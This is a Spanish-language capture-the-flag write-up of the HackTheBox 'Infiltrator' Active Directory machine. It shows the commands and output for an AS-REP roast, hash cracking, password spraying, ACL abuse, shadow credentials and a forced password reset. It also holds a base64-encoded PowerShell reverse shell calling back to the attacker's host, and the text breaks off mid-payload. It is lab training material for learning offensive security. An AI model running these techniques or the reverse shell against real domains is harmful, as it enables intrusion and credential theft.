---
title: Infiltrator - Insane (HTB)
permalink: /Infiltrator-HTB-Writeup/
tags: 
  - "Windows"
  - "Insane"
  - "Active Directory"
  - "AS-REP Roast"
  - "Hash Cracking"
  - "RPC Enumeration"
  - "Credentials Leakage"
  - "BloodHound"
  - "ACL Rights"
  - "GenericAll"
  - "AddSelf"
  - "ForceChangePassword"
  - "Kerberos"
  - "Port Forwarding"
  - "Chisel"
  - "Socat"
  - "Binary Reversing"
  - "dnSPY"
  - "AES Decrypt"
  - "CBC Mode"
  - "sqlite"
  - "API Abuse"
  - "Output Messenger"
  - "Network Traffic Analysis"
  - "pcap"
  - "BitLocker"
  - "7z Files"
  - "NTDS"
  - "ntdissector"
  - "ReadGMSAPassword"
  - "gMSA Abuse"
  - "AD CS"
  - "ESC4"
  - "ESC1"
  - "PassTheTicket"
categories:
  - writeup
  - hacking
  - hackthebox
  - "active directory"
toc: true
toc_label: Topics
toc_sticky: true
sidebar:
  - main
seo_tittle: Infiltrator - Insane (HTB)
seo_description: Un escenario de Active Directory donde debes moverte sigilosamente por diferentes servicios comprometiendo cuentas, explotando derechos DACL mal configurados y abusando de AD CS para vencer Infiltrator.
excerpt: Un escenario de Active Directory donde debes escabullirte por diferentes servicios comprometiendo cuentas, explotando derechos DACL mal configurados y abusando de AD CS para vencer Infiltrator.
header:
  overlay_image: /assets/images/headers/infiltrator-hackthebox.jpg
  overlay_filter: 0.7
  og_image: /assets/images/headers/infiltrator-hackthebox.jpg
---
 
![image-center](/assets/images/posts/infiltrator-hackthebox.png)
{: .align-center}

**Habilidades:** AS-REP Roast Attack, Hash Cracking, RPC Enumeration, Credentials Leakage, Abusing ACL - `GenericAll Rights`, Shadow Credentials, Abusing `AddSelf` Rights, Abusing `ForceChangePassword` Rights, Kerberos Client Setup, Port Forwarding with `chisel` + `socat`, Binary Reversing with `dnSPY`, AES CBC Mode Decrypt, `sqlite` Database Analysis, API Enumeration - Output Messenger `Chatroom` Logs, Abusing Output Messenger Calendar, Network Traffic Analysis - `.pcapng` File, BitLocker Backup Analysis, Cracking `7z` File Password, Dumping Active Directory Password Hashes, NTDS Analysis with `ntdissector`, Abusing `ReadGMSAPassword` Rights, Abusing AD CS - `ESC4` Technique [Privilege Escalation], PassTheTicket
{: .notice--primary}

# Introducción

Infiltrator es una máquina Windows de dificultad `Insane` en HackTheBox que requiere comprometer un dominio de Active Directory. Comenzaremos con una extracción de usuarios desde una web, seguido de abuso de AS-REP Roast y movimiento lateral mediante abuso de derechos DACL. Identificaremos que la organización se comunica mediante la aplicación Output Messenger, donde nos infiltraremos para ir comprometiendo cuentas de usuarios, haciendo ingeniería inversa a un binario y utilizando la API de Output Messenger para ver una contraseña, la cual nos permitirá comprometer a un usuario capaz de llegar a una unidad de BitLocker. Gracias al análisis de tráfico HTTP de un archivo de captura de red, descubriremos la clave de recuperación que nos dará acceso a la unidad protegida por BitLocker. Luego de un intento fallido de PassTheHash llegaremos a comprometer una cuenta que tiene permisos excesivos en una plantilla de AD CS, la cual permita la escalada de privilegios mediante la técnica `ESC4` para ganar acceso privilegiado al dominio.
<br>

# Reconocimiento
---
Primeramente lanzaremos una traza ICMP para verificar que la máquina esté activa y tengamos conectividad con ella

~~~ bash
ping -c 1 10.10.11.31
PING 10.10.11.31 (10.10.11.31) 56(84) bytes of data.
64 bytes from 10.10.11.31: icmp_seq=1 ttl=127 time=233 ms

--- 10.10.11.31 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 232.597/232.597/232.597/0.000 ms
~~~
 

## Nmap Scanning 

Comenzaremos la fase de reconocimiento con un escaneo para detectar puertos abiertos en la máquina víctima

~~~ bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.31 -oG openPorts   
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-12 10:30 EDT
Nmap scan report for 10.10.11.31
Host is up (0.17s latency).
Not shown: 65514 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
15220/tcp open  unknown
49667/tcp open  unknown
49690/tcp open  unknown
49691/tcp open  unknown
49694/tcp open  unknown
49749/tcp open  unknown
49842/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 26.65 seconds
~~~

- `--open`: Mostrar únicamente los puertos abiertos
- `-p-`: Hacer un escaneo del total de puertos **(65535)**
- `--min-rate 5000`: Enviar mínimo **5000 paquetes por segundo**
- `-n`: No aplicar **resolución DNS**, lo que acelera el escaneo
- `-sS`: Modo de **escaneo TCP SYN**, no concluye la conexión, lo que hace el escaneo más ágil
- `-Pn`: Omitir el **descubrimiento de host (ARP)**
- `-oG`: Exportar en formato `grepable`
- `-v`: Ver el progreso del escaneo

Haremos un segundo escaneo a los puertos abiertos descubiertos con el propósito de identifcar la versión y los servicios que se ejecutan 

~~~ bash
nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3389,5985,9389,15220,49667,49690,49691,49694,49749,49842 -sVC 10.10.11.31 -oN services
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-12 10:35 EDT
Nmap scan report for 10.10.11.31
Host is up (0.26s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Infiltrator.htb
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-03-12 14:35:16Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: infiltrator.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-03-12T14:38:34+00:00; -2s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.infiltrator.htb, DNS:infiltrator.htb, DNS:INFILTRATOR
| Not valid before: 2024-08-04T18:48:15
|_Not valid after:  2099-07-17T18:48:15
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: infiltrator.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.infiltrator.htb, DNS:infiltrator.htb, DNS:INFILTRATOR
| Not valid before: 2024-08-04T18:48:15
|_Not valid after:  2099-07-17T18:48:15
|_ssl-date: 2025-03-12T14:38:34+00:00; -1s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: infiltrator.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.infiltrator.htb, DNS:infiltrator.htb, DNS:INFILTRATOR
| Not valid before: 2024-08-04T18:48:15
|_Not valid after:  2099-07-17T18:48:15
|_ssl-date: 2025-03-12T14:38:34+00:00; -2s from scanner time.
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: INFILTRATOR
|   NetBIOS_Domain_Name: INFILTRATOR
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: infiltrator.htb
|   DNS_Computer_Name: dc01.infiltrator.htb
|   DNS_Tree_Name: infiltrator.htb
|   Product_Version: 10.0.17763
|_  System_Time: 2025-03-12T14:37:55+00:00
| ssl-cert: Subject: commonName=dc01.infiltrator.htb
| Not valid before: 2025-03-11T10:01:14
|_Not valid after:  2025-09-10T10:01:14
|_ssl-date: 2025-03-12T14:38:34+00:00; -1s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
15220/tcp open  unknown
49667/tcp open  msrpc         Microsoft Windows RPC
49690/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49691/tcp open  msrpc         Microsoft Windows RPC
49694/tcp open  msrpc         Microsoft Windows RPC
49749/tcp open  msrpc         Microsoft Windows RPC
49842/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -2s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-03-12T14:37:55
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 209.91 seconds
~~~

- `-p`: Especificar puertos
- `-sV`: Identificar la versión del servicio 
- `-sC`: Uso de scripts de reconocimiento
- `-oN`: Exportar la salida en formato normal


## Web Analysis

Como el puerto `80` se encuentra abierto, haremos un escaneo de las tecnologías web para identificar algún gestor de contenido además de las versiones de estas tecnologías

~~~ bash
whatweb http://10.10.11.31                                                                                     
http://10.10.11.31 [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[info@Infiltrator.htb], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.11.31], JQuery[2.1.0], Lightbox, Microsoft-IIS[10.0], Script, Title[Infiltrator.htb]
~~~

Al navegar a la web podremos ver la siguiente página, donde se nos da una cordial bienvenida

![image-center](/assets/images/posts/infiltrator-web-1.png)
{: .align-center}

### Finding Users

Dentro de la web en la sección `Digital Team`, veremos a los miembros del equipo

![image-center](/assets/images/posts/infiltrator-web-2.png)
{: .align-center}

Si hacemos una solicitud con `curl` y filtramos por la etiqueta `<h4>`, encontraremos más posibles usuarios

~~~ bash
curl -s http://infiltrator.htb | grep -i '<h4>'
                                    <h4>Top Notch</h4>
                                    <h4>Robust</h4>
                                    <h4>Reliable</h4>
                                    <h4>Up-to-date</h4>
                            <h4>Initial Work</h4>
                            <h4>Master Planning</h4>
                            <h4>Smooth Execution</h4>
                            <h4>.01 David Anderson</h4>
                            <h4>.02 Olivia Martinez</h4>
                            <h4>.03 Kevin Turner</h4>
                            <h4>.04 Amanda Walker</h4>
                            <h4>.05 Marcus Harris</h4>
                            <h4>.06 Lauren Clark</h4>
                            <h4>.07 Ethan Rodriguez</h4>
~~~


## Web Scrapping - Users

Haremos nuestro propio listado de usuarios aplicando un filtro a una solicitud HTTP, de este modo podremos obtener una lista con los nombres

~~~ bash
curl -s http://infiltrator.htb | grep -oP '<h4>\.\d{2}.*<\/h4>' | awk '{print $2 " " $3}' FS=' ' | tr -d '</h4>'
David Anderson
Olivia Martinez
Kevin Turner
Amanda Walker
Marcus Harris
Lauren Clark
Etan Rodriguez
~~~

Podemos crear un pequeño script de `bash` que convierta los nombres que recolectamos en posibles nombres de usuario siguiendo algunos patrones típicos en Active Directory

~~~ bash
#!/bin/bash

input="$1"
output="$2"

> "$output"

while read -r name lastname; do
    name_lc=$(echo "$name" | tr '[:upper:]' '[:lower:]')
    lastname_lc=$(echo "$lastname" | tr '[:upper:]' '[:lower:]')

    echo "${name_lc}${lastname_lc}"       >> "$output"  # davidanderson
    echo "${name_lc}.${lastname_lc}"      >> "$output"  # david.anderson
    echo "${name_lc}_${lastname_lc}"      >> "$output"  # david_anderson
    echo "${name_lc}"                     >> "$output"  # david
    echo "${lastname_lc}"                   >> "$output"  # anderson
    echo "${name_lc:0:1}${lastname_lc}"   >> "$output"  # danderson
    echo "${name_lc:0:1}.${lastname_lc}"  >> "$output"  # d.anderson
    echo "${lastname_lc}${name_lc}"       >> "$output"  # andersondavid
done < "$input"

sort -u "$output" -o "$output"
~~~

Ejecutamos nuestro script de la siguiente manera, donde los nombres sin procesar correspondería al archivo `names.txt`, y guardamos los nombres de usuario en `users.txt`

~~~ bash
bash name2username.sh names.txt posible_users.txt
~~~


## User Enumeration

Haremos una enumeración frente al protocolo `kerberos` con la ayuda de `kerbrute`, esto nos permitirá validar nombres de usuario, guardaremos con el parámetro `-o` en un archivo `users.txt`

~~~ bash
/opt/kerbrute/kerbrute userenum -d infiltrator.htb --dc dc01.infiltrator.htb posible_users.txt -o users.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 06/07/25 - Ronnie Flathers @ropnop

2025/06/07 13:48:11 >  Using KDC(s):
2025/06/07 13:48:11 >  	dc01.infiltrator.htb:88

2025/06/07 13:48:11 >  [+] VALID USERNAME:	a.walker@infiltrator.htb
2025/06/07 13:48:11 >  [+] VALID USERNAME:	d.anderson@infiltrator.htb
2025/06/07 13:48:11 >  [+] VALID USERNAME:	e.rodriguez@infiltrator.htb
2025/06/07 13:48:12 >  [+] VALID USERNAME:	k.turner@infiltrator.htb
2025/06/07 13:48:12 >  [+] VALID USERNAME:	m.harris@infiltrator.htb
2025/06/07 13:48:13 >  [+] VALID USERNAME:	o.martinez@infiltrator.htb
2025/06/07 13:48:13 >  [+] VALID USERNAME:	l.clark@infiltrator.htb
2025/06/07 13:48:13 >  Done! Tested 56 usernames (7 valid) in 2.328 seconds
~~~

La información se guarda tal como se ve por consola, así que haremos un pequeño tratamiento y guardaremos los cambios con el comando `sponge`

~~~ bash
cat users.txt | grep '@infiltrator.htb' | awk '{print $7}' | awk -F '@' '{print $1}' | sponge users.txt 
~~~
<br>


# Intrusión / Explotación
---
## AS-REP Roast

Listaremos usuarios que puedan ser vulnerables a `AS-REP Roast` enviando el listado que acabamos de generar.

> En `kerberos`, normalmente un usuario que solicita un **Ticket Granting Ticket (TGT)** debe realizar un paso de **pre autenticación**, que incluye cifrar un timestamp con su contraseña.
{: .notice--info}

Cuando un usuario tiene asignado el atributo `UF_DONT_REQUIRE_PREAUTH`, el KDC (Key Distribution Center) envía el TGT sin verificar la identidad del usuario. Esto nos permite solicitar un TGT y capturar un paquete `AS-REP` que contiene la clave del usuario en formato hash, que podemos intentar descifrar de forma offline con un ataque de fuerza bruta

~~~ bash
GetNPUsers.py infiltrator.htb/ -usersfile users.txt
Impacket v0.13.0.dev0+20250109.91705.ac02e0ee - Copyright Fortra, LLC and its affiliated companies 

[-] User a.walker doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User d.anderson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User e.rodriguez doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User k.turner doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User m.harris doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User o.martinez doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$l.clark@INFILTRATOR.HTB:43387d0bd83ad0a8fdcec5c3248e0f72$8f2cf78af355159285faba2a879a77b4b973bf63f6fb566fbc3b3164a149f33238b6045b182f63744428972149267a6a70c3590891e0f5f69f9ba5b7969e02ddeec4445dae625753f1f25978cab0e350c495def9c59f9ce9b33717cdc2d50cef2e34c24c159885f4dfb18fc25125024fa99d50aa840ef8e91f90df6c66764c566688dc358a649e544bc369f6c2032e7a3177bc1666386ebe78dee0b4bf7e8403fa919a8bf47725fda8bbd022a0953df6dc7b6d892851e01eac6f8dec64c8b06d4e68eb7a95b218779c1f1f5b20590a21c50c456b0e3f20fdbf0cfecb9d33feaee2c831af035e70eff1b8b40c13f04f1cb838
~~~


## Hash Cracking

Guardaremos el hash en un archivo, en este caso podemos usar cualquier herramienta que admita el formato `krb5asrep`

~~~ bash
john --wordlist=/usr/share/wordlists/rockyou.txt tgt_hash.txt --format=krb5asrep 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
WAT?watismypass! ($krb5asrep$23$l.clark@INFILTRATOR.HTB)     
1g 0:00:00:11 DONE (2025-06-07 13:54) 0.08841g/s 928752p/s 928752c/s 928752C/s WEBB29..WASHIDA
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
~~~

La herramienta ha encontrado la contraseña `WAT?watismypass!`, esta correspondería al usuario `l.clark`, quien era vulnerable

~~~ bash
nxc smb 10.10.11.31 -u l.clark -p 'WAT?watismypass!' 
SMB         10.10.11.31     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.31     445    DC01             [+] infiltrator.htb\l.clark:WAT?watismypass!
~~~


## RPC Enumeration

Con las credenciales obtenidas, nos conectaremos por el protocolo `rpc` con el objetivo de enumerar información del dominio

~~~ bash
rpcclient -U 'l.clark%WAT?watismypass!' 10.10.11.31
~~~

Podemos obtener un listado de todos los usuarios del dominio con el comando `enumdomusers`

~~~ bash
rpcclient -U 'l.clark%WAT?watismypass!' 10.10.11.31 -c enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[D.anderson] rid:[0x44f]
user:[L.clark] rid:[0x450]
user:[M.harris] rid:[0x451]
user:[O.martinez] rid:[0x452]
user:[A.walker] rid:[0x453]
user:[K.turner] rid:[0x454]
user:[E.rodriguez] rid:[0x455]
user:[winrm_svc] rid:[0x641]
user:[lan_managment] rid:[0x1fa5]
~~~

De esta forma tendremos un listado completo de usuarios válidos, aplicaremos una serie de filtros para obtener un listado completamente limpio

~~~ bash
rpcclient -U 'l.clark%WAT?watismypass!' 10.10.11.31 -c enumdomusers | grep -oP '\[.*?\]' | grep -v 0x | tr -d '[]' > users_rpc.txt
~~~


## Credentials Leakage

Listando las descripciones de las cuentas existentes, llegaremos a ver una contraseña dentro de la descripción del usuario `k.turner`

~~~ bash
rpcclient -U 'l.clark%WAT?watismypass!' 10.10.11.31 -c querydispinfo                                                              
index: 0xfb5 RID: 0x453 acb: 0x00000210 Account: A.walker	Name: (null)	Desc: (null)
index: 0xeda RID: 0x1f4 acb: 0x00000210 Account: Administrator	Name: (null)	Desc: Built-in account for administering the computer/domain
index: 0xfb1 RID: 0x44f acb: 0x00000210 Account: D.anderson	Name: (null)	Desc: (null)
index: 0xfb7 RID: 0x455 acb: 0x00000210 Account: E.rodriguez	Name: (null)	Desc: (null)
index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: (null)	Desc: Built-in account for guest access to the computer/domain
index: 0xfb6 RID: 0x454 acb: 0x00000210 Account: K.turner	Name: (null)	Desc: MessengerApp@Pass!
index: 0xf10 RID: 0x1f6 acb: 0x00000011 Account: krbtgt	Name: (null)	Desc: Key Distribution Center Service Account
index: 0xfb2 RID: 0x450 acb: 0x00010210 Account: L.clark	Name: (null)	Desc: (null)
index: 0x1312 RID: 0x1fa5 acb: 0x00000210 Account: lan_managment	Name: lan_managment	Desc: (null)
index: 0xfb3 RID: 0x451 acb: 0x00000210 Account: M.harris	Name: (null)	Desc: (null)
index: 0xfb4 RID: 0x452 acb: 0x00000210 Account: O.martinez	Name: (null)	Desc: (null)
index: 0xfc1 RID: 0x641 acb: 0x00000210 Account: winrm_svc	Name: (null)	Desc: (null)
~~~


## Password Spraying

En este punto contamos con dos contraseñas, podemos comprobar si se reutilizan utilizándolas para autenticarnos como todos los usuarios

~~~ bash
 /opt/kerbrute/kerbrute passwordspray -d infiltrator.htb --dc 10.10.11.31 users_rpc.txt 'WAT?watismypass!' 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 06/07/25 - Ronnie Flathers @ropnop

2025/06/07 14:37:30 >  Using KDC(s):
2025/06/07 14:37:30 >  	10.10.11.31:88

2025/06/07 14:37:31 >  [+] VALID LOGIN:	L.clark@infiltrator.htb:WAT?watismypass!
2025/06/07 14:37:31 >  [+] VALID LOGIN:	D.anderson@infiltrator.htb:WAT?watismypass!
~~~


## BloodHound Analysis

Recolectaremos información del dominio y la analizaremos con `bloodhound` para identificar rutas potenciales para escalar privilegios. 

Si vamos a usar autenticación `kerberos` no debemos olvidar sincronizar el reloj con el DC

~~~ bash
ntpdate dc01.infiltrator.htb && bloodhound-python -d infiltrator.htb -ns 10.10.11.31 --zip -c All -u l.clark -p 'WAT?watismypass!'                           
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: infiltrator.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.infiltrator.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.infiltrator.htb
INFO: Found 14 users
INFO: Found 58 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc01.infiltrator.htb
INFO: Done in 01M 37S
INFO: Compressing output into 20250607141233_bloodhound.zip
~~~

Podemos obtener tickets `kerberos` que podamos usar a modo de autenticación temporal para evitar el uso explícito de contraseñas

~~~ bash
getTGT.py infiltrator.htb/d.anderson:'WAT?watismypass!' -dc-ip 10.10.11.31
Impacket v0.13.0.dev0+20250109.91705.ac02e0ee - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in d.anderson.ccache
~~~

Para utilizar el ticket, lo asignaremos como la variable de entorno `KRB5CCNAME`

~~~ bash
export KRB5CCNAME=d.anderson.ccache

# Comprobación
klist 
Ticket cache: FILE:d.anderson.ccache
Default principal: d.anderson@INFILTRATOR.HTB

Valid starting       Expires              Service principal
06/12/2025 23:12:03  06/13/2025 03:12:03  krbtgt/INFILTRATOR.HTB@INFILTRATOR.HTB
	renew until 06/13/2025 03:12:03
~~~


## Abusing ACL - `GenericAll` Rights

El usuario `d.anderson` posee derechos `GenericAll` sobre la Unidad Organizativa `Marketing Digital`, esto le permite obtener control total sobre esta OU

![image-center](/assets/images/posts/infiltrator-bloodhound-1.png)
{: .align-center}

Modificaremos `DACL` para otorgar derechos `FullControl` al usuario `d.anderson` con la herramienta `dacledit.py`

~~~ bash
dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'd.anderson' -target-dn 'OU=MARKETING DIGITAL,DC=INFILTRATOR,DC=HTB' infiltrator.htb/d.anderson -k -no-pass -dc-ip 10.10.11.31       
Impacket v0.13.0.dev0+20250109.91705.ac02e0ee - Copyright Fortra, LLC and its affiliated companies 
[*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU
[*] DACL backed up to dacledit-20250607-145051.bak
[*] DACL modified successfully!
~~~


## Shadow Credentials

Con los permisos actuales de escritura sobre esta cuenta, podremos suplantar al usuario `e.rodriguez` a través de una inyección de credenciales en el atributo `msDS-KeyCredentialLink`, de forma que podamos autenticarnos como este usuario sin tener que modificar su contraseña, y así obtener su hash NTLM y credenciales en caché

~~~ bash
certipy shadow auto -k -target dc01.infiltrator.htb -account e.rodriguez -dc-ip 10.10.11.31

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'E.rodriguez'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'b9a1c41c-1719-622b-3aa3-7b4659a9fce5'
[*] Adding Key Credential with device ID 'b9a1c41c-1719-622b-3aa3-7b4659a9fce5' to the Key Credentials for 'E.rodriguez'
[*] Successfully added Key Credential with device ID 'b9a1c41c-1719-622b-3aa3-7b4659a9fce5' to the Key Credentials for 'E.rodriguez'
[*] Authenticating as 'E.rodriguez' with the certificate
[*] Using principal: e.rodriguez@infiltrator.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'e.rodriguez.ccache'
[*] Trying to retrieve NT hash for 'e.rodriguez'
[*] Restoring the old Key Credentials for 'E.rodriguez'
[*] Successfully restored the old Key Credentials for 'E.rodriguez'
[*] NT hash for 'E.rodriguez': b02e97f2fdb5c3d36f77375383449e56
~~~


## Abusing ACL - `AddSelf` Rights

El usuario `e.rodriguez` posee derechos `AddSelf` sobre el grupo `Chiefs Marketing`, esto le da la capacidad de añadirse por su cuenta y convertirse en un miembro de este grupo 

![image-center](/assets/images/posts/infiltrator-bloodhound-2.png)
{: .align-center}

Por conveniencia podemos usar el hash NT del usuario `e.rodriguez`

~~~ bash
bloodyAD --host "dc01.infiltrator.htb" -d "infiltrator.htb" --dc-ip 10.10.11.31 -u 'e.rodriguez' -p ':b02e97f2fdb5c3d36f77375383449e56' add groupMember 'Chiefs Marketing' e.rodriguez

[+] e.rodriguez added to Chiefs Marketing
~~~


## Abusing ACL - `ForceChangePassword` Rights

El grupo `Chiefs Marketing` posee el derecho `ForceChangePassword` sobre el usuario `m.harris`, esto le permite a los miembros de este grupo forzar un cambio de contraseña como el nombre nos indica

![image-center](/assets/images/posts/infiltrator-bloodhound-3.png)
{: .align-center}

Podemos hacer esto mediante varias herramientas, en mi caso he elegido `certipy`

~~~ bash
certipy account update -u e.rodriguez -hashes b02e97f2fdb5c3d36f77375383449e56 -target dc01.infiltrator.htb -user m.harris -pass 'newP@assword2022' -debug

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[+] Trying to resolve 'dc01.infiltrator.htb' at '192.168.29.2'
[+] Trying to resolve '' at '192.168.29.2'
[+] Authenticating to LDAP server
[+] Bound to ldaps://10.10.11.31:636 - ssl
[+] Default path: DC=infiltrator,DC=htb
[+] Configuration path: CN=Configuration,DC=infiltrator,DC=htb
[*] Updating user 'M.harris':
    unicodePwd                          : newP@assword2022
[*] Successfully updated 'M.harris'
~~~

Una vez hemos cambiado la contraseña, podremos obtener un ticket `kerberos` y almacenarlo en unas credenciales de caché

~~~ bash
getTGT.py infiltrator.htb/m.harris:'newP@assword2022' -dc-ip 10.10.11.31

Impacket v0.13.0.dev0+20250109.91705.ac02e0ee - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in m.harris.ccache
~~~


## Kerberos Client Setup

Configuraremos el cliente `kerberos` para que nuestra máquina pueda comunicarse con el KDC correctamente

~~~ bash
cat /etc/krb5.conf
[libdefaults]
  default_realm = INFILTRATOR.HTB
  dns_lookup_realm = false
  dns_lookup_kdc = false

[realms]
  INFILTRATOR.HTB = {
    kdc = dc01.infiltrator.htb
    admin_server = dc01.infiltrator.htb
  }
[domain_realm]
        infiltrator.htb =   INFILTRATOR.HTB
        .infiltrator.htb = INFILTRATOR.HTB
~~~


## Shell as `m.harris`

Cargaremos el ticket en la variable `KRB5CCNAME` y nos conectaremos al Domain Controller especificando el bosque

~~~ bash
KRB5CCNAME=m.harris.ccache evil-winrm -i dc01.infiltrator.htb -r infiltrator.htb
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\M.harris\Documents> whoami
infiltrator\m.harris
~~~

### Shell Stabilization

Es muy probable que nuestra shell muera por un error con `evil-winrm`, así que podemos ejecutar una reverse shell para estabilizar un poco la conexión.

Levantaremos un listener de la siguiente forma desde nuestra máquina atacante

~~~ bash
rlwrap -cAr nc -lvnp 4444
~~~

Podemos crear rápidamente una reverse shell desde [revshells.com]()
~~~ bash
*Evil-WinRM* PS C:\Users\M.harris\Documents> powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AOQA5ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIA